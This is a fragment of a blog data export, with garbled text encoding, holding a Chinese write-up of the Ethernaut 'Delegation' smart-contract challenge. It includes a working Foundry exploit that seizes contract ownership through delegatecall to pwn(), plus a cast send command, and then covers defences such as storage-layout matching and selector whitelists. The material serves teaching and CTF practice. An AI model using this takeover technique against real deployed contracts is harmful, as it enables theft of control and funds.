çš„å­˜å‚¨\n        delegate.pwn();\n        \n        console.log(\"=== After direct call to Delegate.pwn() ===\");\n        console.log(\"Delegation owner:\", delegation.owner()); // ä¸å˜\n        console.log(\"Delegate owner:\", delegate.owner());     // å˜ä¸º attacker\n        \n        // é‡ç½®çŠ¶æ€\n        vm.stopPrank();\n        vm.prank(deployer);\n        delegate = new Delegate(deployer);\n        \n        vm.startPrank(attacker);\n        \n        // é€šè¿‡ delegatecall è°ƒç”¨ pwn()\n        bytes memory payload = abi.encodeWithSignature(\"pwn()\");\n        (bool success,) = address(delegation).call(payload);\n        require(success, \"Delegatecall failed\");\n        \n        console.log(\"=== After delegatecall to pwn() ===\");\n        console.log(\"Delegation owner:\", delegation.owner()); // å˜ä¸º attacker!\n        console.log(\"Delegate owner:\", delegate.owner());     // ä¸å˜\n        \n        vm.stopPrank();\n    }\n    \n    function testFunctionSelector() public view {\n        // æ¼”ç¤ºå‡½æ•°é€‰æ‹©å™¨çš„è®¡ç®—\n        bytes4 selector = bytes4(keccak256(\"pwn()\"));\n        console.log(\"pwn() selector:\");\n        console.logBytes4(selector);\n        \n        bytes memory encoded = abi.encodeWithSignature(\"pwn()\");\n        console.log(\"Encoded call data:\");\n        console.logBytes(encoded);\n    }\n}\n```\n\n### æ‰‹åŠ¨æ”»å‡»è„šæœ¬\n\n```solidity\n// å¦‚æœéœ€è¦æ‰‹åŠ¨æ”»å‡»ï¼Œå¯ä»¥ä½¿ç”¨ cast å‘½ä»¤\ncontract ManualAttack is Test {\n    function testManualAttack() public {\n        // 1. è®¡ç®—å‡½æ•°é€‰æ‹©å™¨\n        bytes4 selector = bytes4(keccak256(\"pwn()\"));\n        console.logBytes4(selector);\n        \n        // 2. ä½¿ç”¨ cast å‘é€äº¤æ˜“\n        // cast send <DELEGATION_ADDRESS> <SELECTOR> --private-key <YOUR_KEY>\n        // ä¾‹å¦‚ï¼šcast send 0x... 0xdd365b8b --private-key ...\n    }\n}\n```\n\n### è¿è¡Œæµ‹è¯•\n\n```bash\n# è¿è¡Œ Delegation æ”»å‡»æµ‹è¯•\nforge test --match-contract DelegationTest -vvv\n\n# é¢„æœŸè¾“å‡ºï¼š\n# Initial owner: 0x... (deployer)\n# Attacker address: 0x... (attacker) \n# New owner: 0x... (attacker)\n# Attack successful!\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### 1. ä¸¥æ ¼çš„å­˜å‚¨å¸ƒå±€åŒ¹é…\n\n```solidity\ncontract SafeProxy {\n    // âœ… ç¡®ä¿ä»£ç†å’Œå®ç°åˆçº¦æœ‰ç›¸åŒçš„å­˜å‚¨å¸ƒå±€\n    address public owner;           // æ§½ 0\n    address public implementation; // æ§½ 1\n    \n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Not owner\");\n        _;\n    }\n    \n    function upgrade(address newImplementation) public onlyOwner {\n        implementation = newImplementation;\n    }\n    \n    fallback() external {\n        address impl = implementation;\n        assembly {\n            // ä½¿ç”¨å†…è”æ±‡ç¼–è¿›è¡Œæ›´å®‰å…¨çš„ delegatecall\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)\n            returndatacopy(0, 0, returndatasize())\n            \n            switch result\n            case 0 { revert(0, returndatasize()) }\n            default { return(0, returndatasize()) }\n        }\n    }\n}\n```\n\n### 2. ä½¿ç”¨ OpenZeppelin çš„ä»£ç†æ¨¡å¼\n\n```solidity\nimport \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol\";\n\ncontract SecureUpgradeableContract {\n    // ä½¿ç”¨ OpenZeppelin çš„æ ‡å‡†åŒ–ä»£ç†å®ç°\n    // åŒ…å«å®Œæ•´çš„å®‰å…¨æ£€æŸ¥å’Œå­˜å‚¨éš”ç¦»\n}\n```\n\n### 3. å‡½æ•°é€‰æ‹©å™¨ç™½åå•\n\n```solidity\ncontract RestrictedDelegation {\n    mapping(bytes4 => bool) public allowedSelectors;\n    \n    constructor() {\n        // åªå…è®¸ç‰¹å®šå‡½æ•°è¢« delegatecall\n        allowedSelectors[bytes4(keccak256(\"safeFunction()\"))] = true;\n    }\n    \n    fallback() external {\n        bytes4 selector = bytes4(msg.data);\n        require(allowedSelectors[selector], \"Function not allowed\");\n        \n        // æ‰§è¡Œ delegatecall\n    }\n}\n```\n\n### 4. å­˜å‚¨æ§½éš”ç¦»\n\n```solidity\ncontract IsolatedStorage {\n    // ä½¿ç”¨ EIP-1967 æ ‡å‡†å­˜å‚¨æ§½\n    bytes32 private constant IMPLEMENTATION_SLOT = \n        bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1);\n    \n    bytes32 private constant ADMIN_SLOT = \n        bytes32(uint256(keccak256('eip1967.proxy.admin')) - 1);\n    \n    function _getImplementation() internal view returns (address) {\n        return StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value;\n    }\n    \n    function _setImplementation(address newImplementation) internal {\n        StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value = newImplementation;\n    }\n}\n```\n\n## ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\n\n### 1. EVM è°ƒç”¨ç±»å‹å¯¹æ¯”\n\n```solidity\ncontract CallExample {\n    function demonstrateCalls(address target) public {\n        // 1. call - æ™®é€šå¤–éƒ¨è°ƒç”¨\n        (bool success1,) = target.call(\n            abi.encodeWithSignature(\"someFunction()\")\n        );\n        \n        // 2. delegatecall - å§”æ‰˜è°ƒç”¨\n        (bool success2,) = target.delegatecall(\n            abi.encodeWithSignature(\"someFunction()\")\n        );\n        \n        // 3. staticcall - åªè¯»è°ƒç”¨\n        (bool success3,) = target.staticcall(\n            abi.encodeWithSignature(\"viewFunction()\")\n        );\n    }\n}\n```\n\n### 2. å­˜å‚¨æ§½å†²çªç¤ºä¾‹\n\n```solidity\n// âŒ å±é™©ï¼šä¸åŒ¹é…çš„å­˜å‚¨å¸ƒå±€\ncontract ProxyV1 {\n    address public owner;    // æ§½ 0\n    uint256 public value;    // æ§½ 1\n}\n\ncontract ImplementationV1 {\n    uint256 public data;     // æ§½ 0 â† å†²çªï¼\n    address public admin;    // æ§½ 1 â† å†²çªï¼\n}\n\n// âœ… å®‰å…¨ï¼šåŒ¹é…çš„å­˜å‚¨å¸ƒå±€\ncontract ProxyV2 {\n    address public owner;    // æ§½ 0\n    uint256 public value;    // æ§½ 1\n}\n\ncontract ImplementationV2 {\n    address public owner;    // æ§½ 0 â† åŒ¹é…\n    uint256 public value;    // æ§½ 1 â† åŒ¹é…\n}\n```\n\n### 3. å‡½æ•°é€‰æ‹©å™¨è®¡ç®—\n\n```solidity\nfunction calculateSelector() public pure returns (bytes4) {\n    // æ–¹æ³• 1ï¼šç›´æ¥è®¡ç®—\n    bytes4 selector1 = bytes4(keccak256(\"pwn()\"));\n    \n    // æ–¹æ³• 2ï¼šä½¿ç”¨ abi.encodeWithSignature\n    bytes memory data = abi.encodeWithSignature(\"pwn()\");\n    bytes4 selector2 = bytes4(data);\n    \n    // æ–¹æ³• 3ï¼šä½¿ç”¨ this.functionName.selector\n    // bytes4 selector3 = this.pwn.selector; // å¦‚æœå‡½æ•°å­˜åœ¨\n    \n    return selector1;\n}\n```\n\n## ğŸ›ï¸ å®é™…åº”ç”¨åœºæ™¯\n\n### ä»£ç†æ¨¡å¼çš„æ­£ç¡®ä½¿ç”¨\n\n1. **å‡çº§æ¨¡å¼**ï¼š\n   - UUPS (Universal Upgradeable Proxy Standard)\n   - Transparent Proxy Pattern\n   - Beacon Proxy Pattern\n\n2. **é’»çŸ³æ¨¡å¼** (EIP-2535)ï¼š\n   - å¤šé¢åˆ‡å‰²åˆçº¦\n   - åŠŸèƒ½æ¨¡å—åŒ–\n\n3. **æœ€å°ä»£ç†** (EIP-1167)ï¼š\n   - Clone Factory Pattern\n   - èŠ‚çœéƒ¨ç½²æˆæœ¬\n\n## ğŸ¯ æ€»ç»“\n\nDelegation å…³å¡æ­ç¤ºäº† `delegatecall` çš„åŒåˆƒå‰‘ç‰¹æ€§ï¼š\n\n- âœ… **ç†è§£ä¸Šä¸‹æ–‡åˆ‡æ¢æœºåˆ¶** - ä»£ç åœ¨ä¸åŒå­˜å‚¨ç©ºé—´æ‰§è¡Œ\n- âœ… **æŒæ¡å­˜å‚¨æ§½å¸ƒå±€åŒ¹é…** - ä»£ç†å’Œå®ç°å¿…é¡»ä¸€è‡´\n- âœ… **å­¦ä¹ å®‰å…¨ä»£ç†æ¨¡å¼** - ä½¿ç”¨æ ‡å‡†åŒ–è§£å†³æ–¹æ¡ˆ\n- âœ… **è®¤è¯†å‡½æ•°é€‰æ‹©å™¨å®‰å…¨** - æ§åˆ¶å¯è°ƒç”¨çš„å‡½æ•°\n\n`delegatecall` æ˜¯å®ç°åˆçº¦å‡çº§å’Œæ¨¡å—åŒ–çš„é‡è¦å·¥å…·ï¼Œä½†ä¹Ÿæ˜¯è®¸å¤šå®‰å…¨æ¼æ´çš„æ ¹æºã€‚ç†è§£å…¶å·¥ä½œåŸç†å¯¹äºæ„å»ºå®‰å…¨çš„å¯å‡çº§åˆçº¦è‡³å…³é‡è¦ã€‚\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[ä¸Šä¸€å…³: Level 5 - Token](/2025/01/25/ethernaut-level-05-token/)**\n- **[ä¸‹ä¸€å…³: Level 7 - Force](/2025/01/25/ethernaut-level-07-force/)**\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[OpenZeppelin ä»£ç†æ–‡æ¡£](https://docs.openzeppelin.com/contracts/4.x/api/proxy)**\n- **[EIP-1967: Standard Proxy Storage Slots](https://eips.ethereum.org/EIPS/eip-1967)**\n- **[GitHub é¡¹ç›®](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n---\n\n*åœ¨æ™ºèƒ½åˆçº¦çš„ä¸–ç•Œä¸­ï¼Œä¸Šä¸‹æ–‡å°±æ˜¯ä¸€åˆ‡ã€‚* ğŸ”„","source":"_posts/ethernaut-level-06-delegation.md","raw":"---\ntitle: 'Ethernaut Level 6: Delegation - delegatecall å­˜å‚¨æ§½æ”»å‡»'\ndate: 2025-01-25 14:50:00\nupdated: 2025-01-25 14:50:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - åŸºç¡€æ”»å‡»ç¯‡ (1-10)\ntags:\n  - Ethernaut\n  - Foundry\n  - delegatecall\n  - å­˜å‚¨æ§½æ”»å‡»\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\n  - Solidity\n  - ä¸Šä¸‹æ–‡åˆ‡æ¢\nseries: Ethernaut Foundry Solutions\nexcerpt: \"æ·±å…¥ç†è§£ delegatecall çš„å·¥ä½œåŸç†å’Œå®‰å…¨é£é™©ï¼Œå­¦ä¹ å¦‚ä½•åˆ©ç”¨å­˜å‚¨æ§½å¸ƒå±€å·®å¼‚è¿›è¡Œæ”»å‡»ï¼ŒæŒæ¡ä»£ç†æ¨¡å¼çš„å®‰å…¨è€ƒé‡ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 6: Delegation - delegatecall å­˜å‚¨æ§½æ”»å‡»\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 6 - Delegation](https://ethernaut.openzeppelin.com/level/6)  \n> **æ”»å‡»ç±»å‹**: delegatecall å­˜å‚¨æ§½æ”»å‡»  \n> **éš¾åº¦**: â­â­â­â­â˜†  \n> **æ ¸å¿ƒæ¦‚å¿µ**: å­˜å‚¨ä¸Šä¸‹æ–‡åˆ‡æ¢ã€ä»£ç†æ¨¡å¼å®‰å…¨\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nè¿™ä¸ªå…³å¡è€ƒéªŒå¯¹ `delegatecall` æœºåˆ¶çš„æ·±å…¥ç†è§£ï¼š\n\n1. **è·å–åˆçº¦æ§åˆ¶æƒ** - æˆä¸º `Delegation` åˆçº¦çš„ `owner`\n2. **ç†è§£ä¸Šä¸‹æ–‡åˆ‡æ¢** - æŒæ¡ `delegatecall` çš„å­˜å‚¨æœºåˆ¶\n3. **å­¦ä¹ ä»£ç†æ¨¡å¼é£é™©** - äº†è§£å‡çº§æ¨¡å¼çš„å®‰å…¨éšæ‚£\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### åˆçº¦æºç åˆ†æ\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract Delegate {\n    address public owner;\n\n    constructor(address _owner) {\n        owner = _owner;\n    }\n\n    function pwn() public {\n        owner = msg.sender;  // ğŸ¯ ç›®æ ‡å‡½æ•°ï¼šä¼šä¿®æ”¹ owner\n    }\n}\n\ncontract Delegation {\n    address public owner;      // ğŸš¨ å­˜å‚¨æ§½ 0\n    Delegate delegate;         // ğŸš¨ å­˜å‚¨æ§½ 1\n\n    constructor(address _delegateAddress) {\n        delegate = Delegate(_delegateAddress);\n        owner = msg.sender;\n    }\n\n    fallback() external {\n        // ğŸš¨ å±é™©çš„ delegatecall\n        (bool result,) = address(delegate).delegatecall(msg.data);\n        if (result) {\n            this;\n        }\n    }\n}\n```\n\n### æ ¸å¿ƒæ¦‚å¿µï¼šdelegatecall vs call\n\n| è°ƒç”¨æ–¹å¼ | æ‰§è¡Œä¸Šä¸‹æ–‡ | å­˜å‚¨ä¿®æ”¹ | msg.sender | ä½¿ç”¨åœºæ™¯ |\n|----------|------------|----------|------------|----------|\n| **call** | è¢«è°ƒç”¨åˆçº¦ | è¢«è°ƒç”¨åˆçº¦ | è°ƒç”¨åˆçº¦åœ°å€ | æ™®é€šå¤–éƒ¨è°ƒç”¨ |\n| **delegatecall** | è°ƒç”¨åˆçº¦ | è°ƒç”¨åˆçº¦ | åŸå§‹è°ƒç”¨è€… | ä»£ç†æ¨¡å¼ã€å‡çº§ |\n\n### æ¼æ´åŸç†\n\n**delegatecall çš„å·¥ä½œæœºåˆ¶**ï¼š\n- æ‰§è¡Œ**è¢«è°ƒç”¨åˆçº¦çš„ä»£ç **\n- ä½¿ç”¨**è°ƒç”¨åˆçº¦çš„å­˜å‚¨**\n- ä¿æŒ**åŸå§‹çš„ msg.sender**\n\n```solidity\n// å½“ Delegation åˆçº¦æ‰§è¡Œ delegatecall æ—¶ï¼š\ndelegate.delegatecall(abi.encodeWithSignature(\"pwn()\"));\n\n// å®é™…æ‰§è¡Œï¼š\n// 1. è¿è¡Œ Delegate.pwn() çš„ä»£ç \n// 2. ä½†æ˜¯åœ¨ Delegation åˆçº¦çš„å­˜å‚¨ä¸Šä¸‹æ–‡ä¸­\n// 3. owner = msg.sender; ä¿®æ”¹çš„æ˜¯ Delegation.owner (å­˜å‚¨æ§½0)\n```\n\n### å­˜å‚¨æ§½å¸ƒå±€åˆ†æ\n\n```solidity\n// Delegate åˆçº¦å­˜å‚¨å¸ƒå±€\n// æ§½ 0: address owner\n\n// Delegation åˆçº¦å­˜å‚¨å¸ƒå±€  \n// æ§½ 0: address owner     â† è¿™ä¸ªä¼šè¢« delegatecall ä¿®æ”¹ï¼\n// æ§½ 1: Delegate delegate\n```\n\n### æ”»å‡»è·¯å¾„\n\n1. **æ„é€ å‡½æ•°è°ƒç”¨æ•°æ®** - ç¼–ç  `pwn()` å‡½æ•°é€‰æ‹©å™¨\n2. **è§¦å‘ fallback å‡½æ•°** - å‘åˆçº¦å‘é€å¸¦æ•°æ®çš„äº¤æ˜“\n3. **æ‰§è¡Œ delegatecall** - åœ¨ Delegation å­˜å‚¨ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œ `pwn()`\n4. **è·å¾—æ§åˆ¶æƒ** - `owner` è¢«è®¾ç½®ä¸ºæ”»å‡»è€…åœ°å€\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Delegation.sol\";\n\ncontract DelegationTest is Test {\n    Delegate public delegate;\n    Delegation public delegation;\n    \n    address public attacker = makeAddr(\"attacker\");\n    address public deployer = makeAddr(\"deployer\");\n\n    function setUp() public {\n        vm.startPrank(deployer);\n        \n        // éƒ¨ç½² Delegate åˆçº¦\n        delegate = new Delegate(deployer);\n        \n        // éƒ¨ç½² Delegation åˆçº¦\n        delegation = new Delegation(address(delegate));\n        \n        vm.stopPrank();\n    }\n\n    function testDelegationExploit() public {\n        console.log(\"Initial owner:\", delegation.owner());\n        console.log(\"Attacker address:\", attacker);\n        \n        vm.startPrank(attacker);\n        \n        // ğŸ¯ å…³é”®æ”»å‡»ï¼šæ„é€  pwn() å‡½æ•°è°ƒç”¨\n        bytes memory payload = abi.encodeWithSignature(\"pwn()\");\n        \n        // é€šè¿‡ fallback å‡½æ•°è§¦å‘ delegatecall\n        (bool success,) = address(delegation).call(payload);\n        require(success, \"Attack failed\");\n        \n        vm.stopPrank();\n        \n        // éªŒè¯æ”»å‡»æˆåŠŸ\n        assertEq(delegation.owner(), attacker);\n        console.log(\"New owner:\", delegation.owner());\n        console.log(\"Attack successful!\");\n    }\n    \n    function testUnderstandDelegatecall() public {\n        vm.startPrank(attacker);\n        \n        console.log(\"=== Before Attack ===\");\n        console.log(\"Delegation owner:\", delegation.owner());\n        console.log(\"Delegate owner:\", delegate.owner());\n        \n        // ç›´æ¥è°ƒç”¨ delegate.pwn() åªä¼šä¿®æ”¹ delegate çš„å­˜å‚¨\n        delegate.pwn();\n        \n        console.log(\"=== After direct call to Delegate.pwn() ===\");\n        console.log(\"Delegation owner:\", delegation.owner()); // ä¸å˜\n        console.log(\"Delegate owner:\", delegate.owner());     // å˜ä¸º attacker\n        \n        // é‡ç½®çŠ¶æ€\n        vm.stopPrank();\n        vm.prank(deployer);\n        delegate = new Delegate(deployer);\n        \n        vm.startPrank(attacker);\n        \n        // é€šè¿‡ delegatecall è°ƒç”¨ pwn()\n        bytes memory payload = abi.encodeWithSignature(\"pwn()\");\n        (bool success,) = address(delegation).call(payload);\n        require(success, \"Delegatecall failed\");\n        \n        console.log(\"=== After delegatecall to pwn() ===\");\n        console.log(\"Delegation owner:\", delegation.owner()); // å˜ä¸º attacker!\n        console.log(\"Delegate owner:\", delegate.owner());     // ä¸å˜\n        \n        vm.stopPrank();\n    }\n    \n    function testFunctionSelector() public view {\n        // æ¼”ç¤ºå‡½æ•°é€‰æ‹©å™¨çš„è®¡ç®—\n        bytes4 selector = bytes4(keccak256(\"pwn()\"));\n        console.log(\"pwn() selector:\");\n        console.logBytes4(selector);\n        \n        bytes memory encoded = abi.encodeWithSignature(\"pwn()\");\n        console.log(\"Encoded call data:\");\n        console.logBytes(encoded);\n    }\n}\n```\n\n### æ‰‹åŠ¨æ”»å‡»è„šæœ¬\n\n```solidity\n// å¦‚æœéœ€è¦æ‰‹åŠ¨æ”»å‡»ï¼Œå¯ä»¥ä½¿ç”¨ cast å‘½ä»¤\ncontract ManualAttack is Test {\n    function testManualAttack() public {\n        // 1. è®¡ç®—å‡½æ•°é€‰æ‹©å™¨\n        bytes4 selector = bytes4(keccak256(\"pwn()\"));\n        console.logBytes4(selector);\n        \n        // 2. ä½¿ç”¨ cast å‘é€äº¤æ˜“\n        // cast send <DELEGATION_ADDRESS> <SELECTOR> --private-key <YOUR_KEY>\n        // ä¾‹å¦‚ï¼šcast send 0x... 0xdd365b8b --private-key ...\n    }\n}\n```\n\n### è¿è¡Œæµ‹è¯•\n\n```bash\n# è¿è¡Œ Delegation æ”»å‡»æµ‹è¯•\nforge test --match-contract DelegationTest -vvv\n\n# é¢„æœŸè¾“å‡ºï¼š\n# Initial owner: 0x... (deployer)\n# Attacker address: 0x... (attacker) \n# New owner: 0x... (attacker)\n# Attack successful!\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### 1. ä¸¥æ ¼çš„å­˜å‚¨å¸ƒå±€åŒ¹é…\n\n```solidity\ncontract SafeProxy {\n    // âœ… ç¡®ä¿ä»£ç†å’Œå®ç°åˆçº¦æœ‰ç›¸åŒçš„å­˜å‚¨å¸ƒå±€\n    address public owner;           // æ§½ 0\n    address public implementation; // æ§½ 1\n    \n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Not owner\");\n        _;\n    }\n    \n    function upgrade(address newImplementation) public onlyOwner {\n        implementation = newImplementation;\n    }\n    \n    fallback() external {\n        address impl = implementation;\n        assembly {\n            // ä½¿ç”¨å†…è”æ±‡ç¼–è¿›è¡Œæ›´å®‰å…¨çš„ delegatecall\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)\n            returndatacopy(0, 0, returndatasize())\n            \n            switch result\n            case 0 { revert(0, returndatasize()) }\n            default { return(0, returndatasize()) }\n        }\n    }\n}\n```\n\n### 2. ä½¿ç”¨ OpenZeppelin çš„ä»£ç†æ¨¡å¼\n\n```solidity\nimport \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol\";\n\ncontract SecureUpgradeableContract {\n    // ä½¿ç”¨ OpenZeppelin çš„æ ‡å‡†åŒ–ä»£ç†å®ç°\n    // åŒ…å«å®Œæ•´çš„å®‰å…¨æ£€æŸ¥å’Œå­˜å‚¨éš”ç¦»\n}\n```\n\n### 3. å‡½æ•°é€‰æ‹©å™¨ç™½åå•\n\n```solidity\ncontract RestrictedDelegation {\n    mapping(bytes4 => bool) public allowedSelectors;\n    \n    constructor() {\n        // åªå…è®¸ç‰¹å®šå‡½æ•°è¢« delegatecall\n        allowedSelectors[bytes4(keccak256(\"safeFunction()\"))] = true;\n    }\n    \n    fallback() external {\n        bytes4 selector = bytes4(msg.data);\n        require(allowedSelectors[selector], \"Function not allowed\");\n        \n        // æ‰§è¡Œ delegatecall\n    }\n}\n```\n\n### 4. å­˜å‚¨æ§½éš”ç¦»\n\n```solidity\ncontract IsolatedStorage {\n    // ä½¿ç”¨ EIP-1967 æ ‡å‡†å­˜å‚¨æ§½\n    bytes32 private constant IMPLEMENTATION_SLOT = \n        bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1);\n    \n    bytes32 private constant ADMIN_SLOT = \n        bytes32(uint256(keccak256('eip1967.proxy.admin')) - 1);\n    \n    function _getImplementation() internal view returns (address) {\n        return StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value;\n    }\n    \n    function _setImplementation(address newImplementation) internal {\n        StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value = newImplementation;\n    }\n}\n```\n\n## ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\n\n### 1. EVM è°ƒç”¨ç±»å‹å¯¹æ¯”\n\n```solidity\ncontract CallExample {\n    function demonstrateCalls(address target) public {\n        // 1. call - æ™®é€šå¤–éƒ¨è°ƒç”¨\n        (bool success1,) = target.call(\n            abi.encodeWithSignature(\"someFunction()\")\n        );\n        \n        // 2. delegatecall - å§”æ‰˜è°ƒç”¨\n        (bool success2,) = target.delegatecall(\n            abi.encodeWithSignature(\"someFunction()\")\n        );\n        \n        // 3. staticcall - åªè¯»è°ƒç”¨\n        (bool success3,) = target.staticcall(\n            abi.encodeWithSignature(\"viewFunction()\")\n        );\n    }\n}\n```\n\n### 2. å­˜å‚¨æ§½å†²çªç¤ºä¾‹\n\n```solidity\n// âŒ å±é™©ï¼šä¸åŒ¹é…çš„å­˜å‚¨å¸ƒå±€\ncontract ProxyV1 {\n    address public owner;    // æ§½ 0\n    uint256 public value;    // æ§½ 1\n}\n\ncontract ImplementationV1 {\n    uint256 public data;     // æ§½ 0 â† å†²çªï¼\n    address public admin;    // æ§½ 1 â† å†²çªï¼\n}\n\n// âœ… å®‰å…¨ï¼šåŒ¹é…çš„å­˜å‚¨å¸ƒå±€\ncontract ProxyV2 {\n    address public owner;    // æ§½ 0\n    uint256 public value;    // æ§½ 1\n}\n\ncontract ImplementationV2 {\n    address public owner;    // æ§½ 0 â† åŒ¹é…\n    uint256 public value;    // æ§½ 1 â† åŒ¹é…\n}\n```\n\n### 3. å‡½æ•°é€‰æ‹©å™¨è®¡ç®—\n\n```solidity\nfunction calculateSelector() public pure returns (bytes4) {\n    // æ–¹æ³• 1ï¼šç›´æ¥è®¡ç®—\n    bytes4 selector1 = bytes4(keccak256(\"pwn()\"));\n    \n    // æ–¹æ³• 2ï¼šä½¿ç”¨ abi.encodeWithSignature\n    bytes memory data = abi.encodeWithSignature(\"pwn()\");\n    bytes4 selector2 = bytes4(data);\n    \n    // æ–¹æ³• 3ï¼šä½¿ç”¨ this.functionName.selector\n    // bytes4 selector3 = this.pwn.selector; // å¦‚æœå‡½æ•°å­˜åœ¨\n    \n    return selector1;\n}\n```\n\n## ğŸ›ï¸ å®é™…åº”ç”¨åœºæ™¯\n\n### ä»£ç†æ¨¡å¼çš„æ­£ç¡®ä½¿ç”¨\n\n1. **å‡çº§æ¨¡å¼**ï¼š\n   - UUPS (Universal Upgradeable Proxy Standard)\n   - Transparent Proxy Pattern\n   - Beacon Proxy Pattern\n\n2. **é’»çŸ³æ¨¡å¼** (EIP-2535)ï¼š\n   - å¤šé¢åˆ‡å‰²åˆçº¦\n   - åŠŸèƒ½æ¨¡å—åŒ–\n\n3. **æœ€å°ä»£ç†** (EIP-1167)ï¼š\n   - Clone Factory Pattern\n   - èŠ‚çœéƒ¨ç½²æˆæœ¬\n\n## ğŸ¯ æ€»ç»“\n\nDelegation å…³å¡æ­ç¤ºäº† `delegatecall` çš„åŒåˆƒå‰‘ç‰¹æ€§ï¼š\n\n- âœ… **ç†è§£ä¸Šä¸‹æ–‡åˆ‡æ¢æœºåˆ¶** - ä»£ç åœ¨ä¸åŒå­˜å‚¨ç©ºé—´æ‰§è¡Œ\n- âœ… **æŒæ¡å­˜å‚¨æ§½å¸ƒå±€åŒ¹é…** - ä»£ç†å’Œå®ç°å¿…é¡»ä¸€è‡´\n- âœ… **å­¦ä¹ å®‰å…¨ä»£ç†æ¨¡å¼** - ä½¿ç”¨æ ‡å‡†åŒ–è§£å†³æ–¹æ¡ˆ\n- âœ… **è®¤è¯†å‡½æ•°é€‰æ‹©å™¨å®‰å…¨** - æ§åˆ¶å¯è°ƒç”¨çš„å‡½æ•°\n\n`delegatecall` æ˜¯å®ç°åˆçº¦å‡çº§å’Œæ¨¡å—åŒ–çš„é‡è¦å·¥å…·ï¼Œä½†ä¹Ÿæ˜¯è®¸å¤šå®‰å…¨æ¼æ´çš„æ ¹æºã€‚ç†è§£å…¶å·¥ä½œåŸç†å¯¹äºæ„å»ºå®‰å…¨çš„å¯å‡çº§åˆçº¦è‡³å…³é‡è¦ã€‚\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[ä¸Šä¸€å…³: Level 5 - Token](/2025/01/25/ethernaut-level-05-token/)**\n- **[ä¸‹ä¸€å…³: Level 7 - Force](/2025/01/25/ethernaut-level-07-force/)**\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[OpenZeppelin ä»£ç†æ–‡æ¡£](https://docs.openzeppelin.com/contracts/4.x/api/proxy)**\n- **[EIP-1967: Standard Proxy Storage Slots](https://eips.ethereum.org/EIPS/eip-1967)**\n- **[GitHub é¡¹ç›®](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n---\n\n*åœ¨æ™ºèƒ½åˆçº¦çš„ä¸–ç•Œä¸­ï¼Œä¸Šä¸‹æ–‡å°±æ˜¯ä¸€åˆ‡ã€‚* ğŸ”„","slug":"ethernaut-level-06-delegation","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbp5000nbf5q1yxb7cbv","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-6-Delegation-delegatecall-å­˜å‚¨æ§½æ”»å‡»\"><a href=\"#ğŸ¯-Ethernaut-Level-6-Delegation-delegatecall-å­˜å‚¨æ§½æ”»å‡»\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 6: Delegation - delegatecall å­˜å‚¨æ§½æ”»å‡»\"></a>ğŸ¯ Ethernaut Level 6: Delegation - delegatecall å­˜å‚¨æ§½æ”»å‡»</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/6\">Ethernaut Level 6 - Delegation</a><br><strong>æ”»å‡»ç±»å‹</strong>: delegatecall å­˜å‚¨æ§½æ”»å‡»<br><strong>éš¾åº¦</strong>: â­â­â­â­â˜†<br><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>: å­˜å‚¨ä¸Šä¸‹æ–‡åˆ‡æ¢ã€ä»£ç†æ¨¡å¼å®‰å…¨</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>è¿™ä¸ªå…³å¡è€ƒéªŒå¯¹ <code>delegatecall</code> æœºåˆ¶çš„æ·±å…¥ç†è§£ï¼š</p>\n<ol>\n<li><strong>è·å–åˆçº¦æ§åˆ¶æƒ</strong> - æˆä¸º <code>Delegation</code> åˆçº¦çš„ <code>owner</code></li>\n<li><strong>ç†è§£ä¸Šä¸‹æ–‡åˆ‡æ¢</strong> - æŒæ¡ <code>delegatecall</code> çš„å­˜å‚¨æœºåˆ¶</li>\n<li><strong>å­¦ä¹ 